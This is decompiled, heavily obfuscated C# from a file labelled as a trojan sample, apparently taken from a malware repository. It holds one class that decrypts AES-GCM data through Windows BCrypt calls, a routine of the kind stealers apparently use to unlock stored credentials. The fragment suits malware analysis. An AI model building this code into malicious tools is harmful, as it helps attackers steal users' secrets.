// Decompiled with JetBrains decompiler
// Type: 򛁷ׁ،�.Ł�;ג꾯
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-5067186ee6f83892e2d9e56ec500c4a4eb78c83006033b7f4ea166072624c87e.exe

using ɛΩŚ\uFFFD\u0097;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace \uDA2C\uDC77ׁ\u060C\uFFFD
{
  internal class Ł\uFFFD\u003Bג꾯
  {
    public byte[] ŧzӛ\u0026Α(
      byte[] ş䕃ׁé̮,
      byte[] _param2,
      byte[] _param3,
      byte[] _param4,
      byte[] _param5)
    {
      IntPtr num1 = this.蠺꾯ē\u0385؜(ɢô鈟ӓ\u07FB.\u06E8Αۚ\uFFFD\uFFFD, ɢô鈟ӓ\u07FB.ЮՄ\uFFFDɇݝ, ɢô鈟ӓ\u07FB.\uFFFD\uFFFDԜ\u00AB\uFFFD);
      IntPtr éɛʓƌϱ;
      IntPtr hglobal = this.ᔖ\uFFFDٗ̀ב(num1, ş䕃ׁé̮, out éɛʓƌϱ);
      ɢô鈟ӓ\u07FB.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authenticatedCipherModeInfo = new ɢô鈟ӓ\u07FB.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(_param2, _param3, _param5);
      byte[] numArray1;
      using (authenticatedCipherModeInfo)
      {
        byte[] numArray2 = new byte[checked (this.ٵņ\uFFFDᔖ\uFFFD(num1) - 1 + 1)];
        int num2 = 0;
        uint num3 = ɢô鈟ӓ\u07FB.R\u07B4\uFFFDŔ̲(éɛʓƌϱ, _param4, _param4.Length, ref authenticatedCipherModeInfo, numArray2, numArray2.Length, (byte[]) null, 0, ref num2, 0);
        if (num3 > 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", (object) num3));
        numArray1 = new byte[checked (num2 - 1 + 1)];
        uint num4 = ɢô鈟ӓ\u07FB.R\u07B4\uFFFDŔ̲(éɛʓƌϱ, _param4, _param4.Length, ref authenticatedCipherModeInfo, numArray2, numArray2.Length, numArray1, numArray1.Length, ref num2, 0);
        if ((int) num4 == (int) ɢô鈟ӓ\u07FB.ΩƉş̧\uFFFD)
          throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
        if (num4 > 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", (object) num4));
      }
      int num5 = (int) ɢô鈟ӓ\u07FB.ɛÒşşҏ(éɛʓƌϱ);
      Marshal.FreeHGlobal(hglobal);
      int num6 = (int) ɢô鈟ӓ\u07FB.ɮƉٗ\uFFFDܣ(num1, 0U);
      return numArray1;
    }

    private int ٵņ\uFFFDᔖ\uFFFD(IntPtr _param1)
    {
      byte[] numArray = this.ӥ\u1CFC̔ک\u061D(_param1, ɢô鈟ӓ\u07FB.מ鈟ɮ퓜鈇);
      return BitConverter.ToInt32(new byte[4]
      {
        numArray[4],
        numArray[5],
        numArray[6],
        numArray[7]
      }, 0);
    }

    private IntPtr 蠺꾯ē\u0385؜(string _param1, string _param2, string _param3)
    {
      IntPtr zero = IntPtr.Zero;
      uint num1 = ɢô鈟ӓ\u07FB.ˤ\uFFFDc\uFFFDƉ(out zero, _param1, _param2, 0U);
      if (num1 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", (object) num1));
      byte[] bytes = Encoding.Unicode.GetBytes(_param3);
      uint num2 = ɢô鈟ӓ\u07FB.䇹2丐ʤŎ(zero, ɢô鈟ӓ\u07FB.œթ\uFFFDzϘ, bytes, bytes.Length, 0);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", (object) num2));
      return zero;
    }

    private IntPtr ᔖ\uFFFDٗ̀ב(IntPtr _param1, byte[] _param2, out IntPtr _param3)
    {
      int int32 = BitConverter.ToInt32(this.ӥ\u1CFC̔ک\u061D(_param1, ɢô鈟ӓ\u07FB.\u00BEm\uFFFDۨ\uFFFD), 0);
      IntPtr num1 = Marshal.AllocHGlobal(int32);
      byte[] numArray = this.Ң\uFFFDۣ\u1CFC\uFFFD(ɢô鈟ӓ\u07FB.퓜\uFFFDݝ\uFFFDג, BitConverter.GetBytes(1), BitConverter.GetBytes(_param2.Length), _param2);
      uint num2 = ɢô鈟ӓ\u07FB.מ\u07FBzﾭߟ(_param1, IntPtr.Zero, ɢô鈟ӓ\u07FB.恁Oӛבҏ, out _param3, num1, int32, numArray, numArray.Length, 0U);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", (object) num2));
      return num1;
    }

    private byte[] ӥ\u1CFC̔ک\u061D(IntPtr _param1, string _param2)
    {
      int num1 = 0;
      uint num2 = ɢô鈟ӓ\u07FB.\u032Eֵٕ㠰̱(_param1, _param2, (byte[]) null, 0, ref num1, 0U);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", (object) num2));
      byte[] numArray = new byte[checked (num1 - 1 + 1)];
      uint num3 = ɢô鈟ӓ\u07FB.\u032Eֵٕ㠰̱(_param1, _param2, numArray, numArray.Length, ref num1, 0U);
      if (num3 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", (object) num3));
      return numArray;
    }

    public byte[] Ң\uFFFDۣ\u1CFC\uFFFD(params byte[][] _param1)
    {
      int num = 0;
      byte[][] numArray1 = _param1;
      int index1 = 0;
      while (index1 < numArray1.Length)
      {
        byte[] numArray2 = numArray1[index1];
        if (numArray2 != null)
          checked { num += numArray2.Length; }
        checked { ++index1; }
      }
      byte[] dst = new byte[checked (num - 1 + 1 - 1 + 1)];
      int dstOffset = 0;
      byte[][] numArray3 = _param1;
      int index2 = 0;
      while (index2 < numArray3.Length)
      {
        byte[] src = numArray3[index2];
        if (src != null)
        {
          Buffer.BlockCopy((Array) src, 0, (Array) dst, dstOffset, src.Length);
          checked { dstOffset += src.Length; }
        }
        checked { ++index2; }
      }
      return dst;
    }
  }
}
